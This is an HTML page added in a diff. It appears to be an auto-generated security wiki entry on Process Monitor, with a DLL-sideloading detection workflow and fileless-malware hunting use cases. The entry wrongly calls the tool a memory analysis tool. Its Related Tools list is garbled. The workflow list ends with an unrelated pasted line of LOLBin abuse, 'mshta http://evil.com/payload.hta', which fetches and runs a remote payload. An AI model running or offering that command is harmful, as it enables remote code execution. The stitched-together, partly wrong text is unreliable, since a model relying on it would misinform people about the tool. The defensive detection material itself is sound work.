@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Process Monitor | Cyber Research Wiki</title>
+    <meta name="description" content="Process Monitor encyclopedia entry." />
+    <link rel="canonical" href="https://danyel-ii.github.io/cyber-research-wiki/tools/process-monitor/" />
+    <link rel="stylesheet" href="/cyber-research-wiki/assets/wiki.css" />
+  </head>
+  <body>
+    <header class="site-shell">
+      <div class="shell-inner">
+        <a class="brand" href="/cyber-research-wiki/">Cyber Research Wiki</a>
+        <nav class="nav">
+          <a href="/cyber-research-wiki/">Index</a>
+          <a href="https://danyel-ii.github.io/WikiCompanion/">Pocket Atlas</a>
+        </nav>
+      </div>
+    </header>
+    <main class="page-shell">
+      <article class="article">
+  <h1>Process Monitor</h1>
+<h2>Overview</h2>
+<p>Process Monitor is a memory analysis tool that appears across malware analysis workflows in this knowledge base. It is referenced as part of higher-level security analysis, investigation, monitoring, or validation activity rather than as an end in itself.</p>
+<h2>What It Is</h2>
+<p>Process Monitor is best understood as a malware-analysis tool in this knowledge base. Its role is conceptual and system-facing rather than procedural: it gives analysts or defenders a structured way to examine evidence, model system behavior, or reason about security state.</p>
+<h2>How It Works</h2>
+<p>Process Monitor works by turning technical inputs into more interpretable outputs at the system level. Across the source skills, it appears as part of larger analysis, investigation, monitoring, or validation loops rather than as a standalone end state.</p>
+<h2>Core Concepts</h2>
+<ul><li>threat hunting</li><li>mitre attack</li><li>dll sideloading</li><li>defense evasion</li><li>t1574</li><li>edr</li><li>proactive detection</li><li>malware</li><li>fileless</li><li>LOLBins</li><li>memory analysis</li><li>detection</li></ul>
+<h2>Typical Workflow</h2>
+<ul><li>1. <strong>Identify Sideloading Targets</strong>: Research known vulnerable applications that load DLLs without full path qualification (LOLBAS, DLL-sideload databases).</li><li>2. <strong>Monitor DLL Load Events</strong>: Query Sysmon Event ID 7 for DLL loads where the DLL path differs from the application&#39;s expected directory.</li><li>3. <strong>Check DLL Signatures</strong>: Flag unsigned or untrusted DLLs loaded by signed executables.</li><li>4. <strong>Detect Path Anomalies</strong>: Identify legitimate executables running from unusual locations (Temp, AppData, Public) that may be decoy wrappers.</li><li>5. <strong>Hash Verification</strong>: Compare loaded DLL hashes against known-good versions and threat intel feeds.</li><li>6. <strong>Correlate with Process Behavior</strong>: Check if the host process exhibits unusual behavior (network connections, child processes) after loading the suspicious DLL.</li><li>7. <strong>Document and Remediate</strong>: Report sideloading instances, quarantine malicious DLLs, and update detection rules.</li><li>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</li><li>Abuse: Execute HTA files with embedded VBScript/JScript</li><li>Example: mshta http://evil.com/payload.hta</li></ul>
+<h2>Use Cases</h2>
+<ul><li>When investigating potential DLL hijacking in enterprise environments</li><li>After EDR alerts on unsigned DLLs loaded by signed applications</li><li>When hunting for APT persistence using legitimate application wrappers</li><li>During incident response to identify trojanized applications</li><li>When threat intel indicates DLL sideloading campaigns targeting specific software</li><li>EDR alerts indicate suspicious behavior from trusted system binaries (PowerShell, mshta, wmic, regsvr32)</li><li>Investigating attacks that leave no traditional malware files on disk</li><li>Analyzing WMI event subscriptions, registry-stored payloads, or scheduled task abuse for persistence</li><li>Building detection rules for LOLBin (Living Off the Land Binary) abuse in enterprise environments</li><li>Memory forensics reveals malicious code but no corresponding files exist on the filesystem</li></ul>
+<h2>Limitations</h2>
+<ul><li>Output still depends on context, data quality, and surrounding analysis.</li><li>The tool should be interpreted as part of a broader workflow, not as a complete answer by itself.</li><li>Capabilities and visibility vary depending on environment, integrations, and available inputs.</li></ul>
+<h2>Related Tools</h2>
+<ul><li>Sysmon, And Fileless Malware Artifacts, And Network Connections, And Process Activity For Observing Fileless Attack Behavior, And Registry Entries, Autoruns, CrowdStrike Falcon, DLL Export Viewer</li></ul>
+<h2>Sources</h2>
+<ul><li>detecting-dll-sideloading-attacks</li><li>detecting-fileless-malware-techniques</li></ul>
+  <div class="footer-space"></div>
+</article>
+    </main>
+  </body>
+</html>
